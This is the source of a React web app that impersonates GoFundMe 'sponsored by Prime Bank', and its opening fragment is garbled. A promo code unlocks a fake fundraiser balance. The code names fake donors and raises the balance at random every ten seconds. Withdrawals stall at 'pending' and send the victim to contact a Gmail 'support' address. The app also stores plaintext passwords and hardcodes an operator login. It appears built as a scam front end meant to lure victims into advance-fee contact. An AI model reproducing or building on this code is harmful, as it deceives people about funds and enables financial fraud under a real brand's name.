          const [promoStatus, setPromoStatus] = React.useState(''); // '' | 'valid' | 'invalid'

          const checkPromo = (code) => {
            setPromoCode(code);
            if (!code.trim()) { setPromoStatus(''); setPromoMsg(''); return; }

            if (PROMO_CODES[upper]) {
              setPromoStatus('valid');
              setPromoMsg(` Code applied! $${PROMO_CODES[upper].toLocaleString()} will be added to your fundraiser.`);

            onContinue();

                        >
                          {profileImg
                            ? <img src={profileImg} alt="Profile" className="w-full h-full object-cover" />
                            : <span className="text-white text-3xl font-bold">{initials}</span>
                          }
                        </div>
                        <button
                          onClick={() => fileInputRef.current.click()}
                          className="absolute bottom-1 right-1 bg-white text-emerald-700 rounded-full p-1.5 shadow-lg hover:bg-emerald-50 transition border border-emerald-200"
                          title="Upload photo"
                        >
                          <Icon name="camera" className="w-3.5 h-3.5" />
                        </button>
                        <input
                          ref={fileInputRef}
                          type="file"
                          accept="image/*"
                          style={{display:'none'}}
                          onChange={handleImgChange}
                        />
                      </div>
                      <p className="text-white font-bold text-lg">{firstName} {lastName}</p>
                      <button onClick={() => fileInputRef.current.click()} className="text-emerald-200 text-xs mt-1 hover:text-white transition"> Change photo</button>
                    </div>

                    {/* Profile Fields */}
                    <div className="px-5 py-5 border-b border-gray-100">
                      <h3 className="text-xs font-bold text-gray-400 uppercase tracking-wider mb-4">Account Info</h3>
                      <div className="space-y-3">
                        <div>
                          <label className="block text-xs font-semibold text-gray-500 mb-1">Email</label>
                          <div className="w-full px-3 py-2.5 bg-gray-50 border border-gray-200 rounded-lg text-sm text-gray-700 truncate">{userEmail || 'Not set'}</div>
                        </div>
                        <div>
                          <label className="block text-xs font-semibold text-gray-500 mb-1">Phone Number</label>
                          <input type="tel" value={phone} onChange={e => setPhone(e.target.value)} placeholder="+1 (555) 000-0000" className="w-full px-3 py-2.5 border-2 border-gray-200 rounded-lg text-sm focus:outline-none focus:border-emerald-500" />
                        </div>
                        <div>
                          <label className="block text-xs font-semibold text-gray-500 mb-1">Address</label>
                          <input type="text" value={address} onChange={e => setAddress(e.target.value)} placeholder="123 Main St, City, State" className="w-full px-3 py-2.5 border-2 border-gray-200 rounded-lg text-sm focus:outline-none focus:border-emerald-500" />
                        </div>
                        <div>
                          <label className="block text-xs font-semibold text-gray-500 mb-1">Sex</label>
                          <select value={sex} onChange={e => setSex(e.target.value)} className="w-full px-3 py-2.5 border-2 border-gray-200 rounded-lg text-sm focus:outline-none focus:border-emerald-500 bg-white">
                            <option value="">Select...</option>
                            <option value="male">Male</option>
                            <option value="female">Female</option>
                            <option value="non-binary">Non-binary</option>
                            <option value="prefer-not">Prefer not to say</option>
                          </select>
                        </div>
                        <button onClick={handleSave} className={`w-full py-2.5 rounded-lg font-semibold text-sm transition ${saved ? 'bg-emerald-100 text-emerald-700 border-2 border-emerald-300' : 'bg-emerald-700 text-white hover:bg-emerald-800'}`}>
                          {saved ? ' Saved!' : 'Save Changes'}
                        </button>
                      </div>
                    </div>

                    {/* Help Center Button */}
                    <div className="px-5 py-4 border-b border-gray-100">
                      <button onClick={() => setView('help')} className="w-full flex items-center justify-between py-3 px-4 bg-emerald-50 hover:bg-emerald-100 rounded-xl transition border border-emerald-100">
                        <div className="flex items-center gap-3">
                          <span className="text-xl"></span>
                          <div className="text-left">
                            <p className="font-semibold text-sm text-emerald-800">Help Center</p>
                            <p className="text-xs text-emerald-600">AI Support  Ask anything</p>
                          </div>
                        </div>
                        <Icon name="chevron-right" className="w-4 h-4 text-emerald-600" />
                      </button>
                    </div>

                    {/* Sign Out */}
                    <div className="px-5 py-5 mt-auto">
                      <button onClick={onLogout} className="w-full py-3 border-2 border-gray-200 rounded-full font-semibold text-sm text-gray-600 hover:bg-gray-50 transition">Sign out</button>
                    </div>
                  </>
                )}
              </div>
            </div>
          );
        };

        // DASHBOARD
        const Dashboard = ({ balance, goal, firstName, lastName, userEmail, profileImg, setProfileImg, donors, currentDonor, promoBalance, onWithdraw, onLogout }) => {
          const percentage = promoBalance > 0 ? (balance / goal) * 100 : 0;
          const [showProfile, setShowProfile] = React.useState(false);
          const initials = ((firstName || '').charAt(0) + (lastName || '').charAt(0)).toUpperCase() || '?';
          
          return (
            <div className="min-h-screen bg-white">
              <div className="bg-white border-b px-4 py-2 flex items-center justify-between">
                <Icon name="search" className="w-5 h-5 text-gray-700" />
                <GoFundMeLogo />
                <button onClick={() => setShowProfile(true)}><Icon name="menu" className="w-5 h-5 text-gray-700" /></button>
              </div>
              {showProfile && <ProfileSidebar firstName={firstName} lastName={lastName} userEmail={userEmail} profileImg={profileImg} setProfileImg={setProfileImg} onClose={() => setShowProfile(false)} onLogout={() => { setShowProfile(false); onLogout(); }} />}
              <div className="relative">
                <img src="https://images.unsplash.com/photo-1622253692010-333f2da6031d?w=800&h=600&fit=crop" alt="Campaign" className="w-full h-96 object-cover"/>
                <div className="absolute top-4 left-4 bg-white rounded-full p-1 shadow-lg">
                  <div className="w-12 h-12 rounded-full bg-purple-500 text-white flex items-center justify-center font-bold overflow-hidden">
                    {profileImg
                      ? <img src={profileImg} alt="Profile" className="w-full h-full object-cover" />
                      : <span>{initials}</span>
                    }
                  </div>
                </div>
                <div className="absolute top-4 right-4">
                  <h1 className="text-white text-xl font-bold text-right drop-shadow-lg">{firstName} {lastName}</h1>
                </div>
                <div className="absolute bottom-6 left-1/2 transform -translate-x-1/2 w-full max-w-2xl px-4">
                  <h2 className="text-white text-3xl font-bold text-center drop-shadow-lg">
                    Your closest supporters are often the first to giveand the ones who help your fundraiser grow.
                  </h2>
                  <div className="flex justify-center gap-1 mt-4">
                    <div className="w-12 h-1 bg-white rounded-full"></div>
                    <div className="w-3 h-1 bg-white/50 rounded-full"></div>
                    <div className="w-3 h-1 bg-white/50 rounded-full"></div>
                  </div>
                </div>
              </div>
              <div className="px-4 py-6">
                {promoBalance > 0 ? (
                  <>
                    <div className="flex items-center gap-6 mb-6">
                      <div className="relative">
                        <svg className="w-24 h-24 transform -rotate-90">
                          <circle cx="48" cy="48" r="40" stroke="#e5e7eb" strokeWidth="8" fill="none" />
                          <circle cx="48" cy="48" r="40" stroke="#00B964" strokeWidth="8" fill="none" strokeDasharray={`${2 * Math.PI * 40}`} strokeDashoffset={`${2 * Math.PI * 40 * (1 - percentage / 100)}`} strokeLinecap="round" />
                        </svg>
                        <div className="absolute inset-0 flex items-center justify-center">
                          <span className="text-2xl font-bold">{Math.round(percentage)}%</span>
                        </div>
                      </div>
                      <div className="flex-1">
                        <div className="text-3xl font-bold mb-1 text-emerald-700">${balance.toLocaleString()} raised</div>
                        <div className="text-sm text-gray-600 mb-2">of ${goal.toLocaleString()} goal</div>
                        {donors.length > 0 && (
                          <>
                            <div className="text-sm text-gray-600 flex items-center gap-1">
                              <span className="w-2 h-2 bg-emerald-500 rounded-full inline-block"></span>
                              {donors[currentDonor]?.name} donated ${donors[currentDonor]?.amount}
                            </div>
                            <div className="text-sm text-gray-400 flex items-center gap-1 mt-0.5">
                              <span className="w-2 h-2 bg-gray-300 rounded-full inline-block"></span>
                              {donors[(currentDonor + 1) % donors.length]?.name} donated ${donors[(currentDonor + 1) % donors.length]?.amount}
                            </div>
                          </>
                        )}
                      </div>
                    </div>
                    <div className="flex gap-3 mb-6">
                      <button onClick={onWithdraw} className="flex-1 px-6 py-3 bg-lime-400 hover:bg-lime-500 text-gray-900 rounded-lg font-bold text-lg">Withdraw</button>
                      <button className="flex-1 px-6 py-3 bg-emerald-800 hover:bg-emerald-900 text-white rounded-lg font-bold text-lg">Share</button>
                    </div>
                  </>
                ) : (
                  <div className="bg-gray-50 border-2 border-dashed border-gray-200 rounded-2xl p-6 text-center mb-6">
                    <div className="text-4xl mb-3"></div>
                    <p className="font-bold text-gray-700 mb-1">No funds yet</p>
                    <p className="text-sm text-gray-500">You did not use a promo code during sign-up. Your fundraiser has $0 raised and no donations.</p>
                    <p className="text-xs text-gray-400 mt-2">To see your funds, sign out and sign up again using a valid <strong>PRIME-GOFUND</strong> promo code.</p>
                  </div>
                )}
                <div>
                  <p className="text-base mb-4">Hi, I'm <strong>{firstName} {lastName}</strong>. Thank you for visiting my fundraiser.</p>
                  <p className="text-base text-gray-600">Your support means the world to me. Every contribution brings us closer to the goal  please share this with your friends and family to help spread the word!</p>
                </div>
              </div>
            </div>
          );
        };

        // WITHDRAW MODAL
        const WithdrawModal = ({ amount, setAmount, balance, onClose, onSubmit }) => (
          <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center p-4 z-50">
            <div className="bg-white rounded-2xl max-w-md w-full p-8 relative">
              <button onClick={onClose} className="absolute top-4 right-4 p-2"><Icon name="x" className="w-5 h-5" /></button>
              <h2 className="text-2xl font-bold mb-6">Withdraw Funds</h2>
              <div className="mb-6">
                <label className="block text-sm font-semibold mb-2">Amount to Withdraw</label>
                <div className="relative">
                  <span className="absolute left-4 top-4 text-gray-600 text-lg">$</span>
                  <input type="number" value={amount} onChange={(e) => setAmount(e.target.value)} placeholder="0.00" className="w-full pl-10 pr-4 py-3 border-2 border-gray-300 rounded-lg" />
                </div>
                <p className="text-sm text-gray-600 mt-2">Available balance: ${balance.toLocaleString()}</p>
              </div>
              <button onClick={onSubmit} disabled={!amount || parseFloat(amount) <= 0} className="w-full px-6 py-3 bg-emerald-700 hover:bg-emerald-800 disabled:bg-gray-300 text-white rounded-lg font-semibold">Submit Request</button>
            </div>
          </div>
        );

        // PENDING MODAL
        const PendingModal = ({ amount, onContact }) => (
          <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center p-4 z-50">
            <div className="bg-white rounded-2xl max-w-md w-full p-8 text-center">
              <div className="w-20 h-20 rounded-full bg-yellow-100 mx-auto mb-4 flex items-center justify-center"><Icon name="clock" className="w-10 h-10 text-yellow-600" /></div>
              <h2 className="text-2xl font-bold mb-3">Request Pending</h2>
              <p className="text-gray-600 mb-4">Your withdrawal request of <strong>${amount}</strong> is pending approval.</p>
              <p className="text-gray-600 mb-6">Please contact <strong>GoFundMe sponsored by Prime Bank</strong> support to complete your withdrawal.</p>
              <button onClick={onContact} className="w-full px-6 py-3 bg-emerald-700 hover:bg-emerald-800 text-white rounded-lg font-semibold">Contact Support</button>
            </div>
          </div>
        );

        // CONTACT FORM MODAL
        const ContactFormModal = ({ amount, name, setName, email, setEmail, onClose, onSend }) => (
          <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center p-4 z-50">
            <div className="bg-white rounded-2xl max-w-md w-full p-8 relative">
              <button onClick={onClose} className="absolute top-4 right-4 p-2"><Icon name="x" className="w-5 h-5" /></button>
              <h2 className="text-2xl font-bold mb-2">Contact Support</h2>
              <p className="text-sm text-gray-600 mb-6">GoFundMe sponsored by Prime Bank</p>
              <div className="space-y-4">
                <div><label className="block text-sm font-semibold mb-2">Full Name</label><input type="text" value={name} onChange={(e) => setName(e.target.value)} placeholder="Enter your full name" className="w-full px-4 py-3 border-2 border-gray-300 rounded-lg" /></div>
                <div><label className="block text-sm font-semibold mb-2">Amount to Withdraw</label><div className="relative"><span className="absolute left-4 top-4 text-gray-600">$</span><input type="text" value={amount} readOnly className="w-full pl-10 pr-4 py-3 border-2 border-gray-300 rounded-lg bg-gray-50" /></div></div>
                <div><label className="block text-sm font-semibold mb-2">Email</label><input type="email" value={email} onChange={(e) => setEmail(e.target.value)} placeholder="your@email.com" className="w-full px-4 py-3 border-2 border-gray-300 rounded-lg" /></div>
                <button onClick={onSend} disabled={!name || !email} className="w-full px-6 py-3 bg-emerald-700 hover:bg-emerald-800 disabled:bg-gray-300 text-white rounded-lg font-semibold">Send to GoFundMe Support</button>
              </div>
            </div>
          </div>
        );

        // ============================================
        // MAIN APP - ONLY STATE MANAGEMENT!
        // ============================================
        function GoFundMeApp() {
          const [currentPage, setCurrentPage] = useState('landing');
          const [onboardingStep, setOnboardingStep] = useState(0);
          const [promoCode, setPromoCode] = useState('');
          const [promoBalance, setPromoBalance] = useState(0); // 0 = no promo used
          const [selectedCategory, setSelectedCategory] = useState('');
          const [beneficiaryType, setBeneficiaryType] = useState('');
          const [fundraisingGoal, setFundraisingGoal] = useState('');
          const [showLoginModal, setShowLoginModal] = useState(false);
          const [showCreateAccountModal, setShowCreateAccountModal] = useState(false);
          const [showSuccessModal, setShowSuccessModal] = useState(false);
          const [showWithdrawModal, setShowWithdrawModal] = useState(false);
          const [showPendingModal, setShowPendingModal] = useState(false);
          const [showContactForm, setShowContactForm] = useState(false);
          const [withdrawAmount, setWithdrawAmount] = useState('');
          const [withdrawName, setWithdrawName] = useState('');
          const [withdrawEmail, setWithdrawEmail] = useState('');
          const [loginEmail, setLoginEmail] = useState('');
          const [loginPassword, setLoginPassword] = useState('');
          const [firstName, setFirstName] = useState('');
          const [lastName, setLastName] = useState('');
          const [isLoggedIn, setIsLoggedIn] = useState(false);
          const [userEmail, setUserEmail] = useState('');
          const [profileImg, setProfileImg] = useState(null);
          const [balance, setBalance] = useState(0);
          const [currentDonor, setCurrentDonor] = useState(0);

          const goal = 100000;
          const allDonors = [
            { name: 'Sarah Thompson', amount: 25 },
            { name: 'Michael Rodriguez', amount: 100 },
            { name: 'Jennifer Kim', amount: 50 },
            { name: 'David Chen', amount: 75 },
            { name: 'Ashley Brown', amount: 200 },
            { name: 'Robert Wilson', amount: 150 },
          ];
          // Only show donors if promo was used
          const donors = promoBalance > 0 ? allDonors : [];

          useEffect(() => {
            if (currentPage === 'dashboard' && promoBalance > 0) {
              // Rotate donors every 3s
              const donorInterval = setInterval(() => setCurrentDonor(p => (p + 1) % allDonors.length), 3000);
              // Auto-increment balance every 10s by random $10$278
              const balanceInterval = setInterval(() => {
                const increment = Math.floor(Math.random() * (278 - 10 + 1)) + 10;
                setBalance(prev => Math.min(prev + increment, goal));
              }, 10000);
              return () => { clearInterval(donorInterval); clearInterval(balanceInterval); };
            }
          }, [currentPage, promoBalance]);

          const handlePromoApplied = (amount) => {
            setPromoBalance(amount);
            setBalance(amount);
          };

          const handleEmailContinue = () => {
            if (userEmail) {
              const existingUser = localStorage.getItem(`gofundme_user_${userEmail}`);
              if (existingUser) {
                setLoginEmail(userEmail);
                alert('Account exists! Please enter your password.');
              } else {
                setShowLoginModal(false);
                setShowCreateAccountModal(true);
              }
            }
          };

          const handleSignIn = () => {
            if (loginEmail === 'GoFundMefoundationassociation@gmail.com' && loginPassword === 'GoFundMeNewYork1') {
              setIsLoggedIn(true);
              setShowLoginModal(false);
              setFirstName('GoFundMe');
              setLastName('Foundation');
              setUserEmail(loginEmail);
              localStorage.setItem('gofundme_logged_in', 'true');
              setCurrentPage('dashboard');
              return;
            }
            const userKey = `gofundme_user_${loginEmail}`;
            const storedUser = localStorage.getItem(userKey);
            if (storedUser) {
              const userData = JSON.parse(storedUser);
              if (userData.password === loginPassword) {
                setIsLoggedIn(true);
                setShowLoginModal(false);
                setFirstName(userData.firstName);
                setLastName(userData.lastName);
                setUserEmail(loginEmail);
                // Restore promo balance if saved
                if (userData.promoBalance) {
                  setPromoBalance(userData.promoBalance);
                  setBalance(userData.promoBalance);
                }
                localStorage.setItem('gofundme_logged_in', 'true');
                setCurrentPage('dashboard');
              } else {
                alert('Invalid password');
              }
            } else {
              alert('No account found. Please sign up.');
            }
          };

          const handleCreateAccount = () => {
            if (firstName && lastName && loginPassword) {
              const userKey = `gofundme_user_${userEmail}`;
              const userData = { firstName, lastName, email: userEmail, password: loginPassword, promoBalance, createdAt: new Date().toISOString() };
              localStorage.setItem(userKey, JSON.stringify(userData));
              localStorage.setItem('gofundme_logged_in', 'true');
              setShowCreateAccountModal(false);
              setShowSuccessModal(true);
              setTimeout(() => {
                setShowSuccessModal(false);
                setIsLoggedIn(true);
                setCurrentPage('dashboard');
              }, 2000);
            }
          };

          const handleWithdrawSubmit = () => {
            setShowWithdrawModal(false);
            setShowPendingModal(true);
          };

          const handleContactSupport = () => {
            setShowPendingModal(false);
            setShowContactForm(true);
          };

          const handleSendEmail = () => {
            if (withdrawName && withdrawEmail) {
              const subject = encodeURIComponent('Withdrawal Request - GoFundMe Sponsored by Prime Bank');
              const body = encodeURIComponent(`Full Name: ${withdrawName}\nAmount: $${withdrawAmount}\nEmail: ${withdrawEmail}`);
              window.open(`mailto:GoFundMefoundationassociation@gmail.com?subject=${subject}&body=${body}`, '_blank');
              setShowContactForm(false);
              setWithdrawAmount('');
              setWithdrawName('');
              setWithdrawEmail('');
            }
          };

          return (
            <>
              {currentPage === 'landing' && <LandingPage onStart={() => setCurrentPage('onboarding')} onMenuClick={() => setShowLoginModal(true)} />}
              {currentPage === 'onboarding' && onboardingStep === 0 && <OnboardingStep0 promoCode={promoCode} setPromoCode={setPromoCode} selectedCategory={selectedCategory} setSelectedCategory={setSelectedCategory} onContinue={() => setOnboardingStep(1)} onSignIn={() => setShowLoginModal(true)} onPromoApplied={handlePromoApplied} />}
              {currentPage === 'onboarding' && onboardingStep === 1 && <OnboardingStep1 beneficiary={beneficiaryType} setBeneficiary={setBeneficiaryType} onContinue={() => setOnboardingStep(2)} onBack={() => setOnboardingStep(0)} />}
              {currentPage === 'onboarding' && onboardingStep === 2 && <OnboardingStep2 goal={fundraisingGoal} setGoal={setFundraisingGoal} onContinue={() => setShowLoginModal(true)} onBack={() => setOnboardingStep(1)} />}
              {currentPage === 'dashboard' && <Dashboard balance={balance} goal={goal} firstName={firstName} lastName={lastName} userEmail={userEmail} profileImg={profileImg} setProfileImg={setProfileImg} donors={donors} currentDonor={currentDonor} promoBalance={promoBalance} onWithdraw={() => setShowWithdrawModal(true)} onLogout={() => { setCurrentPage('landing'); setBalance(0); setPromoBalance(0); }} />}
              {showLoginModal && <LoginModal email={userEmail} setEmail={setUserEmail} password={loginPassword} setPassword={setLoginPassword} onClose={() => setShowLoginModal(false)} onSignIn={handleSignIn} onSignUp={() => { setShowLoginModal(false); setShowCreateAccountModal(true); }} onEmailContinue={handleEmailContinue} />}
              {showCreateAccountModal && <CreateAccountModal firstName={firstName} setFirstName={setFirstName} lastName={lastName} setLastName={setLastName} password={loginPassword} setPassword={setLoginPassword} onClose={() => setShowCreateAccountModal(false)} onCreate={handleCreateAccount} onSignIn={() => { setShowCreateAccountModal(false); setShowLoginModal(true); }} />}
              {showSuccessModal && <SuccessModal />}
              {showWithdrawModal && <WithdrawModal amount={withdrawAmount} setAmount={setWithdrawAmount} balance={balance} onClose={() => setShowWithdrawModal(false)} onSubmit={handleWithdrawSubmit} />}
              {showPendingModal && <PendingModal amount={withdrawAmount} onContact={handleContactSupport} />}
              {showContactForm && <ContactFormModal amount={withdrawAmount} name={withdrawName} setName={setWithdrawName} email={withdrawEmail} setEmail={setWithdrawEmail} onClose={() => setShowContactForm(false)} onSend={handleSendEmail} />}
            </>
          );
        }

        createRoot(document.getElementById('root')).render(<GoFundMeApp />);
    </script>
</body>
</html>
